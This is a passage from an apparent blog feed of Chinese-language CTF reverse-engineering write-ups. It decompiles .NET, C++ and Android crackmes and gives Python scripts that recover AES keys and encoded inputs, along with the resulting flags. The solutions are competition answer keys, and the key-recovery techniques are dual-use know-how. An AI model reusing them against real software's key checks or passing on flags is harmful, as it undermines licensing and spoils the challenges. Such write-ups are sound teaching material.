hashlib.md5()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">str</span> = <span class="string">&#x27;2050608090A0B0C0D02131417191A1B1527282B2D2E2F213234363B3D36494C4D4E415456575C5D5E50626566686C6F6071787B7C72838587898C8D81949596999B9C9F95A8AAAEA0B1B3B4B7B1C2C3C4C6C9CBCEC0D4D7D9DBDCDED0E1E3E4E5E6E8E9ECEEEFE3F7F8FBF&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>hl.update(<span class="built_in">str</span>.encode(encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>hl.hexdigest()</span><br><span class="line"><span class="string">&#x27;c51a6d6d3929cd2a0192572e604b371d&#x27;</span></span><br></pre></td></tr></table></figure><p>拿到flag！</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>又学到了一些z3的用法，真不戳。</p><p>这道题告诉我们，以后算法题无脑上z3就完事了。。。</p><h1 id="鸣谢"><a href="#鸣谢" class="headerlink" title="鸣谢"></a>鸣谢</h1><p>感谢 SSGSS 师傅，在我纠结于官方WP的解法时提醒我还有Z3这个神奇的东西！</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;V&amp;amp;NCTF2021 补题第二篇&lt;/p&gt;
&lt;p&gt;官方WP写的好玄学，其实用z3也可以解的&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="https://s0uthwood.github.io/categories/CTF/"/>
    
    <category term="Reverse" scheme="https://s0uthwood.github.io/categories/CTF/Reverse/"/>
    
    
    <category term="CTF" scheme="https://s0uthwood.github.io/tags/CTF/"/>
    
    <category term="Reverse" scheme="https://s0uthwood.github.io/tags/Reverse/"/>
    
  </entry>
  
  <entry>
    <title>NepCTF2021 re writeups</title>
    <link href="https://s0uthwood.github.io/2021/03/22/NepCTF2021-re-writeups/"/>
    <id>https://s0uthwood.github.io/2021/03/22/NepCTF2021-re-writeups/</id>
    <published>2021-03-22T10:30:03.000Z</published>
    <updated>2021-05-19T17:43:17.026Z</updated>
    
    <content type="html"><![CDATA[<p>NepCTF2021 reverse 前四题</p><a id="more"></a><h1 id="hardsharp-NET-逆向"><a href="#hardsharp-NET-逆向" class="headerlink" title="hardsharp (.NET 逆向)"></a>hardsharp (.NET 逆向)</h1><p>使用exeinfo发现是 C# .NET文件</p><p>直接用 dnSpy 打开</p><p>找到主函数</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">AesClass aesClass = <span class="keyword">new</span> AesClass();</span><br><span class="line"><span class="built_in">string</span> text = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="built_in">string</span> strB = <span class="string">&quot;1Umgm5LG6lNPyRCd0LktJhJtyBN7ivpq+EKGmTAcXUM+0ikYZL4h4QTHGqH/3Wh0&quot;</span>;</span><br><span class="line"><span class="built_in">byte</span>[] array = <span class="keyword">new</span> <span class="built_in">byte</span>[]</span><br><span class="line">&#123;</span><br><span class="line"><span class="number">81</span>,</span><br><span class="line"><span class="number">82</span>,</span><br><span class="line"><span class="number">87</span>,</span><br><span class="line"><span class="number">81</span>,</span><br><span class="line"><span class="number">82</span>,</span><br><span class="line"><span class="number">87</span>,</span><br><span class="line"><span class="number">68</span>,</span><br><span class="line"><span class="number">92</span>,</span><br><span class="line"><span class="number">94</span>,</span><br><span class="line"><span class="number">86</span>,</span><br><span class="line"><span class="number">93</span>,</span><br><span class="line"><span class="number">18</span>,</span><br><span class="line"><span class="number">18</span>,</span><br><span class="line"><span class="number">18</span>,</span><br><span class="line"><span class="number">18</span>,</span><br><span class="line"><span class="number">18</span>,</span><br><span class="line"><span class="number">18</span>,</span><br><span class="line"><span class="number">18</span>,</span><br><span class="line"><span class="number">18</span>,</span><br><span class="line"><span class="number">18</span>,</span><br><span class="line"><span class="number">18</span>,</span><br><span class="line"><span class="number">18</span>,</span><br><span class="line"><span class="number">18</span>,</span><br><span class="line"><span class="number">18</span>,</span><br><span class="line"><span class="number">18</span>,</span><br><span class="line"><span class="number">18</span>,</span><br><span class="line"><span class="number">18</span>,</span><br><span class="line"><span class="number">18</span>,</span><br><span class="line"><span class="number">18</span>,</span><br><span class="line"><span class="number">18</span>,</span><br><span class="line"><span class="number">18</span>,</span><br><span class="line"><span class="number">18</span></span><br><span class="line">&#125;;</span><br><span class="line">Console.WriteLine(<span class="string">&quot;Welcome to nepnep csharp test! plz input the magical code:&quot;</span>);</span><br><span class="line"><span class="built_in">string</span> text2 = Console.ReadLine();</span><br><span class="line"><span class="keyword">if</span> (text2.Length != <span class="number">37</span>)</span><br><span class="line">&#123;</span><br><span class="line">Console.WriteLine(<span class="string">&quot;Nope!&quot;</span>);</span><br><span class="line">Console.ReadKey();</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (text2.Substring(<span class="number">0</span>, <span class="number">4</span>) != <span class="string">&quot;Nep&#123;&quot;</span> || text2[<span class="number">36</span>] != <span class="string">&#x27;&#125;&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">Console.WriteLine(<span class="string">&quot;Nope!&quot;</span>);</span><br><span class="line">Console.ReadKey();</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">text += Convert.ToChar((<span class="built_in">int</span>)(array[i] ^ <span class="number">51</span>)).ToString();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">string</span>.Compare(aesClass.AesEncrypt(text2, text), strB) == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">Console.WriteLine(<span class="string">&quot;wow, you pass it!&quot;</span>);</span><br><span class="line">Console.ReadKey();</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">Console.WriteLine(<span class="string">&quot;Nope!&quot;</span>);</span><br><span class="line">Console.ReadKey();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这才是真正的签到题吧…</p><p>发现是 AES 加密</p><p>进入 AesEncrypt 函数看一眼</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="built_in">string</span> <span class="title">AesEncrypt</span>(<span class="params"><span class="built_in">string</span> str, <span class="built_in">string</span> key</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">string</span>.IsNullOrEmpty(str))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">byte</span>[] bytes = Encoding.UTF8.GetBytes(str);</span><br><span class="line"><span class="built_in">byte</span>[] array = <span class="keyword">new</span> RijndaelManaged</span><br><span class="line">&#123;</span><br><span class="line">Key = Encoding.UTF8.GetBytes(key),</span><br><span class="line">Mode = CipherMode.ECB,</span><br><span class="line">Padding = PaddingMode.PKCS7</span><br><span class="line">&#125;.CreateEncryptor().TransformFinalBlock(bytes, <span class="number">0</span>, bytes.Length);</span><br><span class="line"><span class="keyword">return</span> Convert.ToBase64String(array, <span class="number">0</span>, array.Length);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现使用了 ECB 模式，那么直接上网找个 python 脚本计算就行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">array = [<span class="number">81</span>, <span class="number">82</span>, <span class="number">87</span>, <span class="number">81</span>, <span class="number">82</span>, <span class="number">87</span>, <span class="number">68</span>, <span class="number">92</span>, <span class="number">94</span>, <span class="number">86</span>, <span class="number">93</span>, <span class="number">18</span>, <span class="number">18</span>, <span class="number">18</span>, <span class="number">18</span>, <span class="number">18</span>, <span class="number">18</span>, <span class="number">18</span>, <span class="number">18</span>, <span class="number">18</span>, <span class="number">18</span>, <span class="number">18</span>, <span class="number">18</span>, <span class="number">18</span>, <span class="number">18</span>, <span class="number">18</span>, <span class="number">18</span>, <span class="number">18</span>, <span class="number">18</span>, <span class="number">18</span>, <span class="number">18</span>, <span class="number">18</span>]</span><br><span class="line">key = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> array:</span><br><span class="line">    key += <span class="built_in">chr</span>(i ^ <span class="number">51</span>)</span><br><span class="line"><span class="built_in">print</span> (<span class="string">f&#x27;key: <span class="subst">&#123;key&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> (<span class="string">f&#x27;key length: <span class="subst">&#123;<span class="built_in">len</span>(key)&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">message = <span class="string">&#x27;1Umgm5LG6lNPyRCd0LktJhJtyBN7ivpq+EKGmTAcXUM+0ikYZL4h4QTHGqH/3Wh0&#x27;</span></span><br><span class="line">encrypt_data = message</span><br><span class="line"></span><br><span class="line">cipher = AES.new(key)</span><br><span class="line">result2 = base64.b64decode(encrypt_data)</span><br><span class="line">a = cipher.decrypt(result2)</span><br><span class="line"></span><br><span class="line">a = a.decode(<span class="string">&#x27;utf-8&#x27;</span>,<span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">a = a.rstrip(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">a = a.rstrip(<span class="string">&#x27;\t&#x27;</span>)</span><br><span class="line">a = a.rstrip(<span class="string">&#x27;\r&#x27;</span>)</span><br><span class="line">a = a.replace(<span class="string">&#x27;\x06&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">print(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;data:&#x27;</span>,a)</span><br></pre></td></tr></table></figure><p>得到结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">key: badbadwomen!!!!!!!!!!!!!!!!!!!!!</span><br><span class="line">key length: 32</span><br><span class="line"></span><br><span class="line"> data: Nep&#123;up_up_down_down_B_a_b_A_Nep_nep~&#125;</span><br></pre></td></tr></table></figure><h1 id="二十六进制-（c-c-逆向）"><a href="#二十六进制-（c-c-逆向）" class="headerlink" title="二十六进制 （c / c++ 逆向）"></a>二十六进制 （c / c++ 逆向）</h1><p>先用exeinfo打开，发现是无壳32位c++代码。</p><p>用ida打开，找到有用的字符串，定位关键代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __noreturn <span class="title">sub_4010A0</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> Dst; <span class="comment">// [esp+0h] [ebp-108h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(&amp;Dst, <span class="number">0</span>, <span class="number">0xFF</span>u);</span><br><span class="line">  dword_403378 = (<span class="keyword">int</span>)<span class="built_in">malloc</span>(<span class="number">8u</span>);</span><br><span class="line">  Memory = (<span class="keyword">void</span> *)dword_403378;</span><br><span class="line">  *(_DWORD *)(dword_403378 + <span class="number">4</span>) = <span class="number">0</span>;</span><br><span class="line">  sub_401020(<span class="string">&quot;plz input right num:\n&quot;</span>, Dst);</span><br><span class="line">  sub_401060(<span class="string">&quot;%s&quot;</span>, &amp;Dst, <span class="number">32</span>);</span><br><span class="line">  v0 = atoi64(&amp;Dst);</span><br><span class="line">  sub_401120(v0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输入一个数字，将其传入 <code>sub_401120</code> 函数。</p><p>进入这个函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __cdecl __noreturn <span class="title">sub_401120</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> __int64 v1; <span class="comment">// rdi</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// cl</span></span><br><span class="line"></span><br><span class="line">  v1 = __PAIR__(a1, HIDWORD(a1));</span><br><span class="line">  <span class="keyword">if</span> ( a1 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v2 = sub_401F00(__PAIR__(v1, HIDWORD(v1)), <span class="number">0x1A</span>u, <span class="number">0</span>);</span><br><span class="line">      LODWORD(v1) = v3;</span><br><span class="line">      v4 = byte_402194[HIDWORD(v1) - <span class="number">26</span> * v2];  <span class="comment">// 2163qwe)(*&amp;^%489$!057@#&gt;&lt;A</span></span><br><span class="line">      HIDWORD(v1) = v2;</span><br><span class="line">      sub_401160(v4 ^ <span class="number">7</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v1 );</span><br><span class="line">  &#125;</span><br><span class="line">  sub_401190();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据题目信息的提示，这是把输入数字转换成为26进制，随后进行一个异或运算，然后存到一个地址里。</p><p>进入 <code>sub_401190</code> 函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __noreturn <span class="title">sub_401190</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _DWORD *v0; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// ecx</span></span><br><span class="line">  _DWORD *v2; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// edi</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v4; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">char</span> *v5; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">char</span> v6; <span class="comment">// dl</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// edi</span></span><br><span class="line">  <span class="keyword">void</span> *v9; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// [esp+10h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  v0 = Memory;</span><br><span class="line">  v1 = <span class="number">0</span>;</span><br><span class="line">  v10 = <span class="number">0</span>;</span><br><span class="line">  v2 = Memory;</span><br><span class="line">  v3 = <span class="built_in">strlen</span>(aFb726);</span><br><span class="line">  <span class="keyword">if</span> ( v3 )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !v2 )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      v5 = &amp;aFb726[v4];</span><br><span class="line">      v6 = *(_BYTE *)v2;</span><br><span class="line">      v7 = v10 + <span class="number">1</span>;</span><br><span class="line">      v2 = (_DWORD *)v2[<span class="number">1</span>];</span><br><span class="line">      ++v4;</span><br><span class="line">      <span class="keyword">if</span> ( v6 != *v5 )</span><br><span class="line">        v7 = v10;</span><br><span class="line">      v1 = v7;</span><br><span class="line">      v10 = v7; <span class="comment">// 判断某内存种对应位置是否与 aFb726 字符串相同，相同就在长度上加 1</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v4 &lt; v3 );</span><br><span class="line">    v0 = Memory;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v0 ) </span><br><span class="line">  &#123;</span><br><span class="line">    v8 = v1;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v9 = (<span class="keyword">void</span> *)v0[<span class="number">1</span>];</span><br><span class="line">      dword_403378 = (<span class="keyword">int</span>)v0;</span><br><span class="line">      Memory = v9;</span><br><span class="line">      <span class="built_in">free</span>(v0);</span><br><span class="line">      v0 = Memory;</span><br><span class="line">      --v8;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( Memory ); <span class="comment">// 释放内存</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v8 = <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v10 != <span class="built_in">strlen</span>(aFb726) ) <span class="comment">// 根据之间计算的相同字母数量，判断两个字符串是否相同</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;flag is Error!!!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(v8);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;flag is Right!!!, please md5(&#x27;Nep&#123;you_input_num&#125;&#x27;) submit th4 flag&quot;</span>);</span><br><span class="line">  system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(v8);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以只需要将 aFb726 字符串进行反向计算即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>flag = <span class="string">&#x27;Fb72&gt;&amp;6&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">str</span> = <span class="string">&#x27;2163qwe)(*&amp;^%489$!057@#&gt;&lt;A&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>num = []</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> c <span class="keyword">in</span> flag:</span><br><span class="line"><span class="meta">... </span>    num.append(<span class="built_in">str</span>.index(<span class="built_in">chr</span>(<span class="built_in">ord</span>(c) ^ <span class="number">7</span>)))</span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>num</span><br><span class="line">[<span class="number">25</span>, <span class="number">6</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">15</span>, <span class="number">17</span>, <span class="number">1</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">sum</span> = <span class="number">0</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> i <span class="keyword">in</span> num[::<span class="number">-1</span>]:</span><br><span class="line"><span class="meta">... </span>    <span class="built_in">sum</span> *= <span class="number">26</span></span><br><span class="line"><span class="meta">... </span>    <span class="built_in">sum</span> += i</span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">sum</span></span><br><span class="line"><span class="number">518100101</span></span><br></pre></td></tr></table></figure><p>运行程序进行测试，得到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">plz input right num:</span><br><span class="line">518100101</span><br><span class="line">flag is Right!!!, please md5(&#39;Nep&#123;you_input_num&#125;&#39;) submit th4 flag</span><br><span class="line">请按任意键继续. . .</span><br></pre></td></tr></table></figure><p>根据题目信息，计算一下数字的32位小写md5（一开始算的是 Nep{51…01} 这个字符串的md5，发现不对，所以算数字的试了一下）</p><p>得到flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Nep&#123;967fa25cbea166ded43127f141cff31a&#125;</span><br></pre></td></tr></table></figure><h1 id="password-（安卓逆向）"><a href="#password-（安卓逆向）" class="headerlink" title="password （安卓逆向）"></a>password （安卓逆向）</h1><p>这道题做了好久都没做出来，结果发现是把base64的 ‘+/‘ 记反了…</p><hr><p>首先用 <code>jeb</code> 打开，找到 <code>com.nepnep.app</code> 中的 <code>MainActivity</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> Encrypt en;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.loadLibrary(<span class="string">&quot;native-lib&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MainActivity</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">        <span class="keyword">this</span>.en = <span class="keyword">new</span> Encrypt();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle arg4)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(arg4);</span><br><span class="line">        <span class="keyword">this</span>.setContentView(<span class="number">0x7F0B001C</span>);  <span class="comment">// activity_main</span></span><br><span class="line">        <span class="keyword">this</span>.findViewById(<span class="number">0x7F080057</span>).setOnClickListener(<span class="keyword">new</span> View$OnClickListener(<span class="keyword">this</span>.findViewById(<span class="number">0x7F0800B7</span>), <span class="keyword">this</span>.findViewById(<span class="number">0x7F0800F2</span>)) &#123;  <span class="comment">// btn, key, password</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View arg4)</span> </span>&#123;</span><br><span class="line">                <span class="keyword">if</span>(MainActivity.<span class="keyword">this</span>.verify(<span class="keyword">this</span>.val$key.getText().toString()) == <span class="number">0</span>) &#123;</span><br><span class="line">                    System.out.println(<span class="keyword">this</span>.val$key.getText().toString());</span><br><span class="line">                    Toast.makeText(MainActivity.<span class="keyword">this</span>, <span class="string">&quot;key错误！&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span>(MainActivity.<span class="keyword">this</span>.en.file(<span class="keyword">this</span>.val$passwd.getText().toString().getBytes(), <span class="keyword">this</span>.val$key.getText().toString())) &#123;</span><br><span class="line">                    Toast.makeText(MainActivity.<span class="keyword">this</span>, <span class="string">&quot;明文正确，快去解压缩包获取flag吧！&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                    Toast.makeText(MainActivity.<span class="keyword">this</span>, <span class="string">&quot;明文错误！&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">int</span> <span class="title">verify</span><span class="params">(String arg1)</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码是读入 <code>key</code> 和 <code>password</code>，然后先判断 <code>key</code> 是否正确，如果正确的话判断 <code>password</code> 是否正确</p><p>那么肯定先破解 <code>key</code>，发现 <code>verify</code> 是外部函数</p><p>找到 <code>native-lib.so</code> 文件，拖入ida，找到函数名里搜索 <code>java</code> 或 